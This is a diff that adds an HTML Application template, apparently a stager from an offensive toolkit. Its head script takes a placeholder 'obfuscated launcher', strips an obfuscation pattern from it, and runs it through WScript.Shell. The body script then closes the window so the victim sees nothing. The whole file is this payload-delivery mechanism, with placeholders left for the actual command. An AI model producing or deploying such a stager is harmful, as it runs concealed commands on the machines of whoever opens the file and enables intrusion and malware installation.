@@ -1,0 +1,14 @@
+<html>
+	<head>
+		<script language="javascript">
+			var c= '{{ obfuscated_launcher }}';
+			var d=c.replace(/{{ pattern }}/g,'');
+			new ActiveXObject('WScript.Shell').Run(d);
+		</script>
+	</head>
+	<body>
+		<script language="javascript">
+			self.close();
+		</script>
+	</body>
+</html>
